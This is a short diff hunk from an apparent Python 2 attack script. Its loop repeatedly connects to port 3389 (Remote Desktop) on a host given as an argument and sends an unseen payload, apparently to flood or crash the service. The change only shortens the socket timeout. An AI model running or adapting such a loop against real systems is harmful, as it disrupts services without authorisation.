@@ -7,7 +7,7 @@ i = 1
 while(1):
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.settimeout(17)
+		s.settimeout(7)
 		s.connect((sys.argv[1],3389))
 		print "Sending: %d packets" % i
 		s.send(payload)		
